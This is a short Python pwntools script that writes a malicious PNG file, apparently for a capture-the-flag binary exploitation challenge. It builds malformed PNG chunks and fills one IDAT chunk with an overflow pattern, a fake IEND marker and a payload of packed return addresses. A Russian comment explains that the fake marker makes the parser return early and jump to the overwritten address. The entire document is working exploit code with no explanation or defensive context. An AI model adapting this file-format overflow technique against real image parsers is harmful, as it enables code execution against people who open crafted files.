import struct
from pwn import *

def generate_chunk(data:bytes):
    length = struct.pack('>I', len(data))
    chunk_type = b'IDAT'
    crc = struct.pack('>I', 0)
    return length + chunk_type + data + crc


with open('exploit.png', 'wb') as f:
    f.write(b'\x89PNG\r\n\x1a\n')
    f.write(struct.pack('>I', 13)) # IHDR length
    f.write(b'IHDR') # IHDR chunk type
    f.write(struct.pack('>II', 8, 6)) # width and height
    f.write(b'\x08\x06\x00\x00\x00') # other png headers(not sufficient)
    f.write(b'\x00\x00\x00\x00') # CRC

    f.write(generate_chunk(b'A' * 48))
    payload = p64(0) * 3 + p64(0x4042a0) + p64(0) * 7 + p64(0x401335)
    f.write(generate_chunk(cyclic(119) + b'IEND\x00' + p32(128 + len(payload)) + payload))
    # Меняем поле на IEND чтобы не читал дальше а сделал return тем самым перейдя по переписанному адресу

    

    f.write(struct.pack('>I', 0))
    f.write(b'IEND')
    f.write(b'\x00\x00\x00\x00')

